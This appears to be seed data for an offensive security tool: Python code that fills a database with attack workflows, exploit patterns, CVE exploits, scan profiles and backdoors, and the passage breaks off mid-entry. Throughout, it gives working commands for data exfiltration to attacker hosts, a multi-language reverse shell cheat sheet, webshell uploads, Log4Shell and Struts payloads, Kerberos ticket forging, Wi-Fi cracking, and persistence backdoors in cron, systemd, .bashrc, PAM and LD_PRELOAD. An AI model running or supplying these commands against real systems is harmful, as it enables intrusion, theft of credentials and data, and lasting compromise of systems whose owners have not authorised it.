                "5. DNS Exfil: python3 -c \"import socket; socket.sendto(data, ('attacker.com', 53))\"",
                "6. HTTP Exfil: curl -X POST -d @file http://attacker.com/upload",
                "7. ICMP Exfil: hping3 --data file --icmp target",
                "8. Steganography: steghide embed -cf image.jpg -ef secret.txt",
            ],
            "tools": ["curl", "python3", "steghide", "hping3"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "cobalt_strike_style", {
            "name": "C2/Beacon Setup (Manual)",
            "phases": [
                "1. Generate Payload: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload",
                "2. Listener: msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; exploit'",
                "3. Transfer: python3 -m http.server 8080 (on attacker)",
                "4. Execute: wget http://attacker:8080/payload && chmod +x payload && ./payload",
                "5. Pivot: meterpreter > run autoroute -s 10.0.0.0/24",
                "6. Proxy: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4445",
                "7. SOCKS Proxy: socks4a 127.0.0.1 1080",
            ],
            "tools": ["msfvenom", "msfconsole", "meterpreter"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "network_pivoting", {
            "name": "Network Pivoting & Tunneling",
            "phases": [
                "1. SSH Tunnel: ssh -D 1080 user@jump_host (SOCKS proxy)",
                "2. SSH Tunnel: ssh -L 3306:db_server:3306 user@jump_host",
                "3. Chisel: chisel server --reverse; chisel client attacker:8080 R:socks",
                "4. Proxychains: proxychains nmap -sT -Pn internal_host",
                "5. Port Forwarding: socat TCP-LISTEN:8080,fork TCP:internal:80",
                "6. ICMP Tunnel: icmpsh -t target -d attacker_ip",
                "7. DNS Tunnel: dnscat2 attacker.com",
            ],
            "tools": ["ssh", "chisel", "socat", "proxychains", "dnscat2"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "wireless_attack_chain", {
            "name": "Complete Wireless Attack Chain",
            "phases": [
                "1. Monitor Mode: airmon-ng start wlxc4e984dfb30f",
                "2. Recon: airodump-ng wlan0mon --write /tmp/recon",
                "3. Target Selection: Identify WPA2 networks with clients",
                "4. Capture Handshake: airodump-ng --bssid MAC --channel CH -w /tmp/handshake wlan0mon",
                "5. Deauth: aireplay-ng -0 10 -a MAC wlan0mon",
                "6. Crack: aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/handshake-01.cap",
                "7. If WPS: reaver -i wlan0mon -b MAC -vv",
                "8. PMKID: hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --filterlist_ap=MAC",
            ],
            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "hcxdumptool"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "api_pentest", {
            "name": "REST API Penetration Test",
            "phases": [
                "1. Enum: curl -s target/api/v1/ | jq",
                "2. Auth Bypass: Remove auth headers, use empty token",
                "3. IDOR: Change ID in /api/users/123 to /api/users/1",
                "4. Injection: POST with {\"username\":\"admin'--\"}",
                "5. XXE: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                "6. Rate Limit: for i in $(seq 1 1000); do curl -s target/login; done",
                "7. JWT: jwt_tool token.txt -C -d /usr/share/wordlists/john.lst",
                "8. SSRF: {\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
            ],
            "tools": ["curl", "jq", "jwt_tool", "burpsuite"],
            "estimated_time": "2-4 hours",
        }, "owasp"))

        seed.append(("workflow", "cloud_pentest_aws", {
            "name": "AWS Cloud Pentest",
            "phases": [
                "1. Enum: aws iam list-users; aws s3 ls",
                "2. Creds: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "3. Privesc: aws iam create-access-key --user-name admin",
                "4. S3 Bucket: aws s3 sync s3://bucket /tmp/exfil",
                "5. Lambda: aws lambda get-function --function-name admin_func",
                "6. Secrets: aws secretsmanager get-secret-value --secret-id prod/db",
                "7. EC2: aws ec2 describe-instances --filters Name=instance-state-name,Values=running",
            ],
            "tools": ["aws-cli", "pacu", "loudcloud"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "reverse_shell_cheatsheet", {
            "name": "Reverse Shell Techniques",
            "shells": {
                "bash": "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
                "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "perl": "perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}'",
                "php": "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f",
                "ncat": "ncat ATTACKER 4444 -e /bin/sh",
                "java": "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"});p.waitFor()",
                "powershell": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            },
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # EXPLOIT PATTERNS (25)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "ssh_bruteforce_hydra", {
            "name": "SSH Brute Force with Hydra",
            "command": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -vV",
            "description": "4-thread SSH brute force with verbose output",
            "requires_auth": True,
            "risk": "high",
            "detection": "Failed login attempts in auth.log",
        }, "mitre"))

        seed.append(("exploit_pattern", "ssh_default_creds", {
            "name": "SSH Default Credentials",
            "command": "sshpass -p 'admin' ssh admin@{target}",
            "credentials": ["admin:admin", "root:root", "root:toor", "root:password", "admin:password", "user:user", "root:123456", "admin:1234"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "ftp_anon_exploit", {
            "name": "FTP Anonymous Access Exploitation",
            "steps": [
                "1. nmap --script ftp-anon {target}",
                "2. ftp anonymous@{target}",
                "3. cd / (explore full filesystem)",
                "4. wget ftp://{target}/etc/passwd",
                "5. wget ftp://{target}/etc/shadow (if readable)",
                "6. Upload webshell if writable: PUT shell.php",
            ],
            "requires_auth": False,
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_exploitation", {
            "name": "SMB Exploitation Chain",
            "steps": [
                "1. enum4linux -a {target}",
                "2. smbclient -N //{target}/share -L",
                "3. smbclient -N //{target}/share -c 'get /etc/passwd'",
                "4. If EternalBlue: use exploit/windows/smb/ms17_010_eternalblue",
                "5. If writable share: upload reverse shell",
                "6. Crack SMB hashes: john --wordlist=rockyou.txt smb_hashes.txt",
            ],
            "tools": ["enum4linux", "smbclient", "msfconsole"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "redis_exploitation", {
            "name": "Redis Unauthorized Access Exploitation",
            "steps": [
                "1. redis-cli -h {target} INFO (check version)",
                "2. redis-cli -h {target} KEYS * (list keys)",
                "3. SSH Key Write: redis-cli -h {target} CONFIG SET dir /root/.ssh",
                "   redis-cli -h {target} CONFIG SET dbfilename authorized_keys",
                "   redis-cli -h {target} SET x '\\n\\nssh-rsa AAAA...\\n\\n'",
                "   redis-cli -h {target} SAVE",
                "4. Crontab Write: redis-cli -h {target} CONFIG SET dir /var/spool/cron",
                "   redis-cli -h {target} CONFIG SET dbfilename root",
                "   redis-cli -h {target} SET x '\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n'",
                "   redis-cli -h {target} SAVE",
                "5. Webshell: CONFIG SET dir /var/www/html && CONFIG SET dbfilename shell.php",
            ],
            "tools": ["redis-cli"],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "mysql_exploitation", {
            "name": "MySQL Exploitation",
            "steps": [
                "1. mysql -h {target} -u root -p",
                "2. Brute Force: hydra -l root -P rockyou.txt mysql://{target}",
                "3. UDF Privesc: SELECT sys_exec('id');",
                "4. File Read: SELECT LOAD_FILE('/etc/passwd');",
                "5. File Write: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
                "6. Linked Server: EXEC master.dbo.xp_cmdshell 'whoami';",
            ],
            "tools": ["mysql", "hydra"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "postgresql_exploitation", {
            "name": "PostgreSQL Exploitation",
            "steps": [
                "1. psql -h {target} -U postgres",
                "2. Brute Force: hydra -l postgres -P rockyou.txt postgres://{target}",
                "3. Command Exec: SELECT lo_from_bytea(0, '\\x3c3f706870...');",
                "4. File Read: COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/out';",
                "5. Copy: COPY accounts TO '/tmp/accounts.csv' CSV;",
                "6. UDF: CREATE FUNCTION system(cstring) RETURNS int AS '/usr/lib/libc.so.6', 'system';",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "tomcat_exploitation", {
            "name": "Apache Tomcat Exploitation",
            "steps": [
                "1. hydra -l tomcat -P rockyou.txt http-get://{target}/manager/html",
                "2. Upload WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war",
                "3. curl -u tomcat:password --upload-file shell.war http://{target}/manager/text/deploy?path=/shell",
                "4. Access: http://{target}/shell/cmd.jsp",
                "5. If manager not found: search for /host-manager/html",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "iis_exploitation", {
            "name": "IIS Exploitation",
            "steps": [
                "1. Directory Enum: gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
                "2. WebDAV: davtest -url http://{target}",
                "3. PUT file: curl -T shell.aspx http://{target}/uploads/shell.aspx",
                "4. ASPX Webshell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker -f aspx -o shell.aspx",
                "5. Shortname: dir /b /s C:\\*.aspx (via command injection)",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "apache_struts_exploits", {
            "name": "Apache Struts Exploits",
            "cves": ["CVE-2017-5638", "CVE-2018-11776", "CVE-2017-9805"],
            "command": "curl -H 'Content-Type: %{#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Struts\",\"Vulnerable\")}' http://{target}/action",
            "description": "OGNL injection in Content-Type header",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "spring_exploits", {
            "name": "Spring Framework Exploits",
            "cves": ["CVE-2022-22963", "CVE-2022-22965"],
            "command": "curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")' http://{target}/functionRouter",
            "description": "Spring4Shell and Spring Cloud Function RCE",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "log4j_exploitation", {
            "name": "Log4Shell (CVE-2021-44228)",
            "command": "curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://{target}/api",
            "description": "JNDI injection via Log4j. Send payload in any header, User-Agent, or input field.",
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_relay_attack", {
            "name": "SMB Relay Attack",
            "steps": [
                "1. Responder -I eth0 (capture NTLM hashes)",
                "2. ntlmrelayx.py -t {target} -smb2support",
                "3. Force authentication: powershell -c 'Invoke-WebRequest http://attacker/share'",
                "4. Relay to target for command execution",
            ],
            "tools": ["responder", "ntlmrelayx.py", "impacket"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "llmnr_nbtns_poisoning", {
            "name": "LLMNR/NBT-NS Poisoning",
            "steps": [
                "1. responder -I eth0 -wrf",
                "2. Wait for victims to request shares",
                "3. Capture NTLMv2 hashes",
                "4. Crack: hashcat -m 5600 hash.txt rockyou.txt",
            ],
            "tools": ["responder", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "kerberoasting", {
            "name": "Kerberoasting",
            "steps": [
                "1. GetUserSPNs.py domain/user:pass -request",
                "2. Hashcat: hashcat -m 13100 spn_hashes.txt rockyou.txt",
                "3. If cracked: psexet.py domain/svc_account:password@target",
            ],
            "tools": ["impacket", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "as_reproasting", {
            "name": "AS-REP Roasting",
            "steps": [
                "1. GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt",
                "2. Hashcat: hashcat -m 18200 asrep.txt rockyou.txt",
                "3. Use cracked password for lateral movement",
            ],
            "tools": ["impacket", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "dcsync_attack", {
            "name": "DCSync Attack",
            "command": "secretsdump.py domain/admin:pass@dc_ip",
            "description": "Replicate domain controller to extract all password hashes",
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "golden_ticket", {
            "name": "Golden Ticket",
            "steps": [
                "1. Get krbtgt hash: secretsdump.py domain/admin:pass@dc_ip -just-dc-user krbtgt",
                "2. Create ticket: ticketer.py -nthash krbtgt_HASH -domain-sid S-1-5-21-... -domain DOMAIN user",
                "3. Export: export KRB5CCNAME=user.ccache",
                "4. Access: psexet.py -k -no-pass domain/user@target",
            ],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "silver_ticket", {
            "name": "Silver Ticket",
            "steps": [
                "1. Get service hash: secretsdump.py domain/admin:pass@target -just-dc-user svc_account",
                "2. Create ticket: ticketer.py -nthash SVC_HASH -domain-sid SID -domain DOMAIN -spn cifs/target user",
                "3. Access SMB: smbclient.krb5 -k -no-pass user@target -c 'ls'",
            ],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_signing_bypass", {
            "name": "SMB Signing Bypass",
            "command": "crackmapexec smb {target} --gen-relay-list targets.txt",
            "description": "Find hosts without SMB signing for relay attacks",
            "tools": ["crackmapexec", "ntlmrelayx"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "ipv6_poisoning", {
            "name": "IPv6 LLMNR Poisoning",
            "steps": [
                "1. mitm6 -d domain.com -w",
                "2. ntlmrelayx.py -6 -t dc_ip -l /tmp.loot",
                "3. Wait for DNS update requests",
                "4. Relay NTLM auth to DC",
            ],
            "tools": ["mitm6", "ntlmrelayx"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "wpbrute", {
            "name": "WordPress Brute Force",
            "command": "wpscan --url http://{target} -U admin -P /usr/share/wordlists/rockyou.txt --threads 50",
            "description": "WordPress login brute force with enumeration",
            "tools": ["wpscan"],
            "requires_auth": True,
        }, "owasp"))

        seed.append(("exploit_pattern", "jboss_exploitation", {
            "name": "JBoss Exploitation",
            "steps": [
                "1. Deploy WAR: curl -X POST http://{target}/jmx-console/HtmlAdaptor --data 'action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=http://attacker/evil.war'",
                "2. If JMX: java -jar jmx-cli.jar -i {target}",
                "3. JMX Console: http://{target}/jmx-console/",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "weblogic_exploitation", {
            "name": "Oracle WebLogic Exploitation",
            "cves": ["CVE-2019-2725", "CVE-2020-14882", "CVE-2021-2109"],
            "command": "python3 weblogic_poc.py {target} 7001",
            "description": "WebLogic deserialization and path traversal RCE",
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # CVE PATTERNS (20)
        # ══════════════════════════════════════════════════════
        seed.append(("cve_pattern", "eternalblue_ms17_010", {
            "name": "EternalBlue (MS17-010)", "cve": "CVE-2017-0144",
            "target": "SMB (445)", "affected": "Windows 7, Server 2008 R2",
            "exploit": "ms17_010_eternalblue", "severity": "critical",
        }, "mitre"))

        seed.append(("cve_pattern", "bluekeep_cve_2019_0708", {
            "name": "BlueKeep (CVE-2019-0708)", "cve": "CVE-2019-0708",
            "target": "RDP (3389)", "affected": "Windows 7, Server 2008",
            "severity": "critical",
        }, "mitre"))

        seed.append(("cve_pattern", "log4shell_cve_2021_44228", {
            "name": "Log4Shell", "cve": "CVE-2021-44228",
            "target": "Any Log4j 2.x", "severity": "critical",
            "description": "JNDI injection in Log4j. Exploit via any input header.",
            "exploit": "curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}' target",
        }, "mitre"))

        seed.append(("cve_pattern", "spring4shell_cve_2022_22965", {
            "name": "Spring4Shell", "cve": "CVE-2022-22965",
            "target": "Spring Framework < 5.3.18", "severity": "critical",
            "description": "RCE via data binding in Spring Framework on JDK 9+",
        }, "mitre"))

        seed.append(("cve_pattern", "proxylogon_cve_2021_26855", {
            "name": "ProxyLogon", "cve": "CVE-2021-26855",
            "target": "Microsoft Exchange", "severity": "critical",
            "description": "SSRF in Exchange leading to RCE. Chain with CVE-2021-27065 for write.",
        }, "mitre"))

        seed.append(("cve_pattern", "proxyshell_cve_2021_34473", {
            "name": "ProxyShell", "cve": "CVE-2021-34473",
            "target": "Microsoft Exchange", "severity": "critical",
            "description": "Pre-auth RCE chain in Exchange. CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207",
        }, "mitre"))

        seed.append(("cve_pattern", "dirty_pipe_cve_2022_0847", {
            "name": "Dirty Pipe", "cve": "CVE-2022-0847",
            "target": "Linux Kernel 5.8+", "severity": "critical",
            "description": "Overwrite arbitrary read-only files. Local privilege escalation.",
        }, "mitre"))

        seed.append(("cve_pattern", "dirty_cow_cve_2016_5195", {
            "name": "Dirty COW", "cve": "CVE-2016-5195",
            "target": "Linux Kernel < 4.8.3", "severity": "high",
            "description": "Race condition in memory management. Local privilege escalation.",
        }, "mitre"))

        seed.append(("cve_pattern", "heartbleed_cve_2014_0160", {
            "name": "Heartbleed", "cve": "CVE-2014-0160",
            "target": "OpenSSL 1.0.1 - 1.0.1f", "severity": "critical",
            "description": "Memory disclosure in TLS heartbeat. Read server memory including keys.",
        }, "mitre"))

        seed.append(("cve_pattern", "shellshock_cve_2014_6271", {
            "name": "Shellshock", "cve": "CVE-2014-6271",
            "target": "Bash < 4.3", "severity": "critical",
            "description": "Arbitrary command execution via environment variable injection.",
            "exploit": "curl -H 'User-Agent: () { :; }; echo; /bin/id' http://target/cgi-bin/vulnerable.cgi",
        }, "mitre"))

        seed.append(("cve_pattern", "struts2_cve_2017_5638", {
            "name": "Apache Struts2 RCE", "cve": "CVE-2017-5638",
            "target": "Apache Struts 2.3.x - 2.3.31, 2.5.x - 2.5.10", "severity": "critical",
            "description": "OGNL injection in Content-Type header during file upload.",
        }, "mitre"))

        seed.append(("cve_pattern", "redis_unauth", {
            "name": "Redis Unauthorized Access", "cve": "N/A (misconfiguration)",
            "target": "Redis (6379)", "severity": "high",
            "description": "Redis without auth allows SSH key write, crontab write.",
        }, "mitre"))

        seed.append(("cve_pattern", "memcached_amplification", {
            "name": "Memcached Amplification", "cve": "N/A (misconfiguration)",
            "target": "Memcached (11211)", "severity": "high",
            "description": "DDoS amplification vector. Can amplify traffic 10,000x.",
        }, "mitre"))

        seed.append(("cve_pattern", "mongodb_unauth", {
            "name": "MongoDB Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "MongoDB (27017)", "severity": "high",
            "description": "MongoDB without auth exposes all data.",
        }, "mitre"))

        seed.append(("cve_pattern", "elasticsearch_unauth", {
            "name": "Elasticsearch Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "Elasticsearch (9200)", "severity": "high",
            "description": "Elasticsearch without auth allows data read/write and RCE.",
        }, "mitre"))

        seed.append(("cve_pattern", "docker_api_exposure", {
            "name": "Docker API Exposure", "cve": "N/A (misconfiguration)",
            "target": "Docker API (2375/2376)", "severity": "critical",
            "description": "Docker API exposed without TLS. Full root access to host.",
            "exploit": "curl http://target:2375/containers/json",
        }, "mitre"))

        seed.append(("cve_pattern", "kubernetes_dashboard", {
            "name": "Kubernetes Dashboard Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "K8s Dashboard (8443)", "severity": "high",
            "description": "Kubernetes dashboard exposed without authentication.",
        }, "mitre"))

        seed.append(("cve_pattern", "jenkins_unauth", {
            "name": "Jenkins Unauthorized Access", "cve": "N/A (misconfiguration)",
            "target": "Jenkins (8080)", "severity": "high",
            "description": "Jenkins without auth allows script console RCE.",
            "exploit": "http://target:8080/script (Groovy script console)",
        }, "mitre"))

        seed.append(("cve_pattern", "gitlab_cve_2021_22214", {
            "name": "GitLab RCE", "cve": "CVE-2021-22214",
            "target": "GitLab", "severity": "critical",
            "description": "Import from remote URL leads to SSRF and RCE.",
        }, "mitre"))

        seed.append(("cve_pattern", "fortinet_cve_2022_40684", {
            "name": "Fortinet FortiOS Authentication Bypass", "cve": "CVE-2022-40684",
            "target": "FortiOS", "severity": "critical",
            "description": "Authentication bypass via crafted HTTP header.",
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # SCAN PROFILES & TECHNIQUES (15)
        # ══════════════════════════════════════════════════════
        seed.append(("scan_profile", "aggressive_full", {
            "name": "Aggressive Full Scan",
            "command": "nmap -A -T4 --max-rate 10000 -p- {target}",
            "description": "Full port scan with OS detection, version detection, scripts, and traceroute.",
            "duration": "5-15min per host",
        }, "internal"))

        seed.append(("scan_profile", "quick_full_port", {
            "name": "Quick Full Port Scan",
            "command": "nmap -sS -T4 -p- --max-rate 10000 {target}",
            "description": "SYN scan all 65535 ports at maximum speed.",
            "duration": "30-90s per host",
        }, "internal"))

        seed.append(("scan_profile", "vuln_exploit", {
            "name": "Vulnerability & Exploit Scan",
            "command": "nmap --script vuln,exploit -T4 --max-rate 5000 {target}",
            "description": "Run all vulnerability and exploit scripts.",
            "duration": "5-20min per host",
        }, "internal"))

        seed.append(("scan_profile", "web_deep", {
            "name": "Deep Web Application Scan",
            "commands": [
                "nikto -h {target} -Tuning 1234567890abcde",
                "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50",
                "wfuzz -c /tmp/wfuzz.conf -z file,/usr/share/wordlists/dirb/common.txt http://{target}/FUZZ",
            ],
            "description": "Nikto + Gobuster + Wfuzz for complete web enumeration.",
            "duration": "10-30min",
        }, "internal"))

        seed.append(("scan_profile", "smb_deep", {
            "name": "SMB Deep Enumeration",
            "commands": [
                "enum4linux -a -v {target}",
                "smbclient -N //{target}/share -L",
                "smbmap -H {target} -R",
                "nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 {target}",
            ],
            "description": "Complete SMB enumeration and vulnerability check.",
            "duration": "5-15min",
        }, "internal"))

        seed.append(("scan_profile", "snmp_enum", {
            "name": "SNMP Enumeration",
            "commands": [
                "snmpwalk -v2c -c public {target}",
                "snmp-check {target} -c public",
                "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common_snmp_community_strings.txt {target}",
            ],
            "description": "SNMP community string brute force and enumeration.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "dns_enum", {
            "name": "DNS Enumeration",
            "commands": [
                "nmap --script dns-brute,dns-zone-transfer -p 53 {target}",
                "dnsrecon -d {target} -t std,rvr,mx,axfr",
                "dnsenum --enum {target}",
            ],
            "description": "DNS zone transfer, brute force, and record enumeration.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "ldap_enum", {
            "name": "LDAP Enumeration",
            "commands": [
                "ldapsearch -x -h {target} -b dc=domain,dc=com",
                "ldapsearch -x -h {target} -b 'cn=Users,dc=domain,dc=com'",
                "nmap --script ldap-search -p 389 {target}",
            ],
            "description": "LDAP enumeration for user and group information.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "nse_vuln_scripts", {
            "name": "NSE Vulnerability Scripts",
            "scripts": [
                "vuln", "exploit", "auth", "brute",
                "smb-vuln*", "http-vuln*", "ssl-*",
                "ftp-anon", "ssh-auth-methods",
            ],
            "description": "Run all NSE vulnerability detection scripts.",
        }, "internal"))

        seed.append(("scan_profile", "wifi_deauth", {
            "name": "WiFi Deauthentication Attack",
            "commands": [
                "airmon-ng start wlxc4e984dfb30f",
                "airodump-ng --bssid {bssid} --channel {ch} -w /tmp/cap wlan0mon",
                "aireplay-ng -0 10 -a {bssid} wlan0mon",
                "aircrack-ng -w rockyou.txt /tmp/cap-01.cap",
            ],
            "description": "Capture WPA2 handshake via deauthentication.",
            "requires_auth": True,
        }, "internal"))

        seed.append(("scan_profile", "wifi_wps_attack", {
            "name": "WPS PIN Attack",
            "commands": [
                "wash -i wlxc4e984dfb30f",
                "reaver -i wlxc4e984dfb30f -b {bssid} -vv",
                "bully -b {bssid} -c {ch} -d -v 3",
            ],
            "description": "Brute force WPS PIN to recover WPA2 password.",
            "requires_auth": True,
        }, "internal"))

        seed.append(("scan_profile", "bluetooth_enum", {
            "name": "Bluetooth Enumeration",
            "commands": [
                "hcitool scan",
                "hcitool inq",
                "sdptool browse {mac}",
                "btscan -i hci0",
            ],
            "description": "Discover and enumerate Bluetooth devices and services.",
        }, "internal"))

        seed.append(("scan_profile", "netbios_enum", {
            "name": "NetBIOS Enumeration",
            "commands": [
                "nbtscan {target}",
                "nmap --script nbstat -p 137 {target}",
                "enum4linux -U {target}",
            ],
            "description": "NetBIOS name resolution and user enumeration.",
        }, "internal"))

        seed.append(("scan_profile", "aggressive_web", {
            "name": "Aggressive Web Scan",
            "commands": [
                "nikto -h {target} -Tuning 67890abcde -timeout 5",
                "dirb http://{target} /usr/share/wordlists/dirb/big.txt -r -z 100",
                "whatweb -a 3 {target}",
                "curl -s http://{target}/robots.txt",
                "curl -s http://{target}/.env",
                "curl -s http://{target}/.git/config",
            ],
            "description": "Aggressive web app discovery including sensitive files.",
        }, "internal"))

        seed.append(("scan_profile", "ssh_enum", {
            "name": "SSH Enumeration",
            "commands": [
                "nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {target}",
                "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p test ssh://{target} -t 1 -V",
            ],
            "description": "SSH version and configuration enumeration.",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # BACKDOOR & PERSISTENCE (15)
        # ══════════════════════════════════════════════════════
        seed.append(("backdoor", "ssh_key_backdoor", {
            "name": "SSH Authorized Keys Backdoor",
            "command": "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
            "description": "Add attacker SSH key for persistent access.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "cron_backdoor", {
            "name": "Cron Job Backdoor",
            "command": "echo '*/5 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1' | crontab -",
            "description": "Reverse shell every 5 minutes via cron.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "systemd_service", {
            "name": "Systemd Service Backdoor",
            "steps": [
                "1. Create /etc/systemd/system/update.service",
                "2. [Service] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'",
                "3. [Install] WantedBy=multi-user.target",
                "4. systemctl enable update.service",
            ],
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "motd_backdoor", {
            "name": "MOTD Backdoor",
            "command": "echo 'bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> /etc/update-motd.d/00-header",
            "description": "Execute on every login via MOTD scripts.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "dotfile_backdoor", {
            "name": "Dotfile Backdoor",
            "command": "echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> /root/.bashrc",
            "description": "Reverse shell on every bash login.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "pam_backdoor", {
            "name": "PAM Backdoor",
            "steps": [
                "1. cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so",
                "2. Modify to add backdoor: add 'int __attribute__((constructor)) init(){system(\"/tmp/backdoor\");}'",
                "3. Replace original: cp /tmp/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so",
            ],
            "requires_auth": True, "risk": "critical",
        }, "mitre"))

        seed.append(("backdoor", "rootkit", {
            "name": "Simple Rootkit (LD_PRELOAD)",
            "steps": [
                "1. Create shared library with hidden backdoor",
                "2. echo '/tmp/evil.so' >> /etc/ld.so.preload",
                "3. All processes now load the rootkit",
            ],
            "requires_auth": True, "risk": "critical",
        }, "mitre"))

        seed.append(("backdoor", "reverse_portknock", {
            "name": "Reverse Shell via Port Knocking",
            "steps": [
